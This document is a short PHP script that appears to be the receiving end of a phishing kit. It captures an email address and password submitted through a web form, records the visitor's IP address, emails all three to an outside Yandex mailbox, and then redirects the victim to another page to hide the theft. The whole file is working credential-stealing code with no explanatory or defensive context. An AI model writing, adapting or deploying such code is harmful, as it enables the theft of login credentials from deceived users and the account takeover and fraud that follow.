<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || OTHER Tare_ama || :------\n";
$message .= "email: ".$_POST['formtext1']."\n";
$message .= "Password: ".$_POST['formtext2']."\n";
$message .= "----: || THANKS || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="willianahppy@yandex.com";
$subject = "tare_ama | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: page66.html");
?>